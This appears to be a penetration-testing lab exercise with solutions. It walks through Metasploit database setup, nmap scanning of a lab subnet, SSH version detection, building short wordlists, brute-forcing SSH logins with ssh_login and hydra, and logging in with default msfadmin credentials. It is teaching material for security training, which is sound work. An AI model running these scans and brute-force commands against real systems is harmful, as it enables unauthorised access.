### Scanning with Metasploit

**Instructions**

Launch a Terminal and prepare the database.

```bash
    # Starts the PostgreSQL server
    $ service postgresql start
    # Initializes the Metasploit database
    $ msfdb init
    $ msfconsole
    msf > workspace -a pillaging
    [*] Added workspace: pillaging
```

Launch `msfconsole`, then and perform a `db_nmap` scan to discover hosts and services for the `192.168.11.0/24` subnet. Verify that your scans identify the host you exploited in the previous session.

`msf > db_nmap -sS -O 192.168.11.0/24`

  - Use a scanner to determine which version of SSH is running on the target host.

    **Hint**: `scanner/ssh`.

```bash 
msf auxiliary(scanner/portscan/syn) > search scanner/ssh
msf use auxiliary/scanner/ssh/ssh_version
msf set RHOSTS 192.168.11.8
msf set THREADS 10
msf auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.11.8
msf auxiliary(scanner/ssh/ssh_version) > run
```
Use the module to determine if the target is vulnerable to a brute-force attack.

    **Hint**: `check`

Create custom wordlists. Add `msfadmin` to the list of usernames and passwords.

**Hint** Use only the last three user names from the common.usr file and the last five passwords from the default.pwd file found in the `/usr/share/ncrack` directory. 

  ```bash 
  msf use auxiliary/scanner/ssh/ssh_login
  msf auxiliary(auxiliary/scanner/ssh/ssh_login) > cd /usr/share/ncrack
  msf auxiliary(auxiliary/scanner/ssh/ssh_login) > tail -n 5 default.pwd > short.pwd
  msf auxiliary(auxiliary/scanner/ssh/ssh_login) > tail -n 3 common.usr > short.usr
  msf auxiliary(auxiliary/scanner/ssh/ssh_login) > echo "msfadmin" >> short.pwd
  msf auxiliary(auxiliary/scanner/ssh/ssh_login) > echo "msfadmin" >> short.usr
```             
    
Exploit the host.
- `msfadmin:msfadmin`
Use the credentials you discovered to log into the target.

**Questions:**

Review the answers to the exercise questions:

- Which command would you use to determine the target's SSH version _without_ using Metasploit?

   **Solution**: `ncat Victim IP Address> 22` and wait for the banner.

- Which command would you run to perform a brute-force attack _without_ using Metasploit?

   **Solution**: `hydra -L /usr/share/ncrack/short.usr -P /usr/share/ncrack/short.pwd ssh:<Victim IP Address>`.

- Name one advantage to using Metasploit's scanning modules over Nmap.

   **Solution**: Metasploit's scanning modules can be used for precise version scans right within Metasploit. Nmap can do this via Nmap Scripts, but `scanner` modules tend to integrate better with Metasploit's database and other modules.

- Name one disadvantage to using Metasploit's scanning modules over Nmap.

   **Solution**: Metasploit's scanning modules are nowhere near as flexible as Nmap. It only offers six port scans—none of which are UDP. Nmap is a better tool for port scanning. Metasploit can be useful for specific version scans.
